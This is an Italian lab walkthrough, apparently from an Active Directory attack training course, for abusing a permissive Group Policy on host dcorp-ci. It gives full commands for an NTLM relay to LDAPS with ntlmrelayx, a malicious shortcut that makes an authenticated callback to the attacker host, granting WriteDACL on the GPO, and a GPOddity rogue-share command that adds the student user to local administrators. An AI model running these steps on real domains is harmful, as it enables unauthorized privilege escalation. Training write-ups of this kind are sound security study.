# LEARNING OBJECTIVE 6

<div data-full-width="true"><figure><img src="../.gitbook/assets/Schermata da 2025-11-26 14-55-27.png" alt=""><figcaption></figcaption></figure></div>

* Abuse an overly permissive Group Policy to add studentx to the local\
  administrators group on dcorp-ci.

<figure><img src="../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### 1.Upload di un link malevolo, navigando la share \\\dcorp-ci\AI mostra un file di log in cui sono riportate esecuzioni automatizzate come devopsadmin &#x20;

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Attivazione ntlm relay usando wsl (WSLToTh3Rescue! come password)

{% code fullWidth="true" %}
```bash
sudo ntlmrelayx.py -t ldaps:// 172.16.2.1 -wh 172.16.100.178 -http-port '80,8080' -i --no-smb-server
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Creazione link e upload su dcorp-ci

```powershell
C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -Command "Invoke-WebRequest -Uri 'http://172.16.100.178' -UseDefaultCredentials"
```

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### 2. Auto esecuzione del .lnk hostato su dcorp-ci ![](<../.gitbook/assets/image (5) (1) (1) (1).png>)

connessione alla ldap shell su porta 11000 in localhost

```bash
nc 127.0.0.1 11000
```

<figure><img src="../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### 3.Relay Authentication e GPO Write permissions

Forniamo a student178 il permesso WriteDACL su Devops Policy, prima recuperiamo il <kbd>gcpfilesyspath</kbd>&#x20;

```powershell
 Get-DomainGPO | Select-Object displayname, name, gpcfilesyspath
```

<figure><img src="../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>

Aggiorniamo la GPO per student178 su DevOps policy

```bash
write_gpo_dacl student178 {0BF8D01C-1F62-4BDC-958C-57140B67D147}
```

<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

#### 4.Utilizzare GPOddity per far puntare un smbshare che hosta un GPT (Group Policy Template) malevolo

```bash
sudo python3 gpoddity.py --gpo-id '0BF8D01C-1F62-4BDC-958C-57140B67D147' --domain 'dollarcorp.moneycorp.local' --username 'student178' --password '43pDfWvvESHPg8Xv' --command 'net localgroup administrators student178 /add' --rogue-smbserver-ip 172.16.100.178 --rogue-smbserver-share 'std178-gp' --dc-ip 172.16.2.1 --smb-mode none
```

<figure><img src="../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>

Lasciando in esecuzione GPOddity, lanciare una nuova shell con wsl per creare e condividere la directory con la GPT malevola

```bash
mkdir /mnt/c/AD/Tools/std178-gp
cp -r /mnt/c/AD/Tools/GPOddity/GPT_Out/* /mnt/c/AD/Tools/std178-gp
```

<figure><img src="../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

#### 5.GPO aggiornata

DA un prompt amministrativo sulla student VM  eseguire i seguenti comandi&#x20;

```powershell
net share std178-gp=C:\AD\Tools\std178-gp /grant:Everyone,Full
icacls "C:\AD\Tools\std178-gp" /grant Everyone:F /T
```

<figure><img src="../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>

Verificare che la modifica al gpcFilesSysPath sia avvenuta

```powershell
Get-DomainGPO -Identity "DevOps Policy"
```

<figure><img src="../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

#### 6. Fetchin, Update e abuso della GPO modificata tramite GPT malevola

In media le GPO vengono aggiornata ogni due minuti dal DC verso il dominio(ma questo tempo e' legato alla configurazione del dominio stesso)

```powershell
winrs -r:dcorp-ci cmd /c "set username && set computername"
```

<figure><img src="../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
